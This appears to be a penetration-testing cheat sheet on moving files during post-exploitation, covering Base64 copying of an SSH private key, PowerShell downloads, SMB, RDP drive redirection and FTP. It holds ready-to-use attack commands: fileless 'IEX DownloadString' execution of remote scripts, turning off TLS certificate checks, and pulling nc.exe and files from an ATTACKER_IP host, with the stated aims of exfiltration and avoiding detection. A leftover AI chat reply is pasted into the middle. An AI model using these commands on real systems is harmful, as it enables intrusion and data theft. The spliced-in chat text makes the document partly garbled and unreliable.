File transfers are a critical part of post-exploitation. They are commonly used to move tools, exfiltrate data, upload payloads, or retrieve configuration files when pivoting or operating under network restrictions.

---
## Base64 File Transfer (No Network Communication)

This method is useful when:

- Outbound network traffic is blocked
    
- Only terminal or web shell access is available
    
- Small to medium files need to be transferred
    

The idea is to convert a binary file into a text-safe Base64 string, copy it manually, and reconstruct it on the target system.

**Linux → Windows workflow:**

1. Calculate the MD5 hash of the original file to verify integrity later.

```bash
md5sum id_rsa
```

2. Encode the file into a single-line Base64 string.

```bash
cat id_rsa | base64 -w 0
```

3. Paste the Base64 string into the Windows PowerShell session.
4. Decode and recreate the file.

```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa",[Convert]::FromBase64String("<BASE64_STRING>"))
```

5. Validate the transfer by comparing MD5 hashes.

```powershell
Get-FileHash C:\Users\Public\id_rsa -Algorithm MD5
```

**Limitations:**

- PowerShell and `cmd.exe` have string length limits
- Web shells may truncate large payloads
- Not suitable for large binaries

---

## PowerShell Web Downloads

Most corporate environments allow outbound HTTP/HTTPS traffic, making web-based downloads one of the most reliable methods for file transfers.

### Net.WebClient

`Net.WebClient` is available in all PowerShell versions and provides multiple methods for downloading content.

**Download a file to disk:**

```powershell
(New-Object Net.WebClient).DownloadFile('https://example.com/file.ps1', 'C:\Users\Public\file.ps1')
```

This method writes the file directly to disk and is simple and reliable.

**Fileless execution (in-memory):**

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://example.com/script.ps1')
```

This approach avoids touching disk, reducing forensic artifacts and detection.


### Invoke-WebRequest

Available in PowerShell 3.0 and later, this cmdlet offers more flexibility but is slower.

```powershell
Invoke-WebRequest https://example.com/file.ps1 -OutFile file.ps1
```

**Common problems and fixes:**

- Internet Explorer first-launch configuration not completed:
    

```powershell
Invoke-WebRequest <url> -UseBasicParsing
```

- SSL/TLS certificate validation errors:
    

```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

---

## SMB Downloads

SMB is widely used in Windows enterprise networks and is effective when TCP/445 is allowed internally.

### SMB Server Setup (Linux)

```bash
sudo impacket-smbserver share /tmp/smbshare -smb2support
```

This exposes a directory over SMB that Windows systems can access.

### Downloading Files (Windows)

```cmd
copy \\ATTACKER_IP\share\nc.exe
```

**Guest access restrictions:**  
Modern Windows systems block unauthenticated SMB access. In that case, credentials must be set.

```bash
sudo impacket-smbserver share /tmp/smbshare -user test -password test
```

```cmd
net use n: \\ATTACKER_IP\share /user:test test
copy n:\nc.exe
```

---
Perfect, I see what you want now 👍  
Below is **a clean section you can drop anywhere in that text**, written in the **same tone, structure, and technical level**, **no emojis**, explaining **RDP shared folder (drive redirection)**.

You can place it **after SMB / FTP**, or under a new heading like _RDP File Transfers_.

---

## RDP Drive Redirection (Shared Folder)

RDP supports **local drive redirection**, allowing a directory from the attacker machine to be mounted inside the remote Windows session. This provides a reliable method for **bidirectional file transfer** once valid RDP credentials are available.

### File Transfer via xfreerdp

```bash
xfreerdp /u:<username> /p:<password> /d:<domain> /v:<target_ip> /drive:<share_name>,<local_path>
```

- `<share_name>` is a logical name that will appear on the Windows system
    
- `<local_path>` is an existing directory on the attacker machine


### Accessing the Shared Folder on Windows

Once connected via RDP, the shared directory is accessible at:

```
\\tsclient\<share_name>
```

It is also visible in **File Explorer → This PC** as a redirected drive.

---

## FTP Downloads

FTP is useful in environments where legacy protocols are still allowed.

### Start FTP Server (Linux)

```bash
sudo python3 -m pyftpdlib --port 21
```

Anonymous login is enabled by default unless credentials are specified.

### PowerShell FTP Download

```powershell
(New-Object Net.WebClient).DownloadFile(
'ftp://ATTACKER_IP/file.txt',
'C:\Users\Public\file.txt'
)
```

### Non-interactive FTP (No Shell Required)

When only command execution is available, FTP scripts can be used.

```cmd
ftp -v -n -s:ftp.txt
```

This allows automated downloads without interactive input.


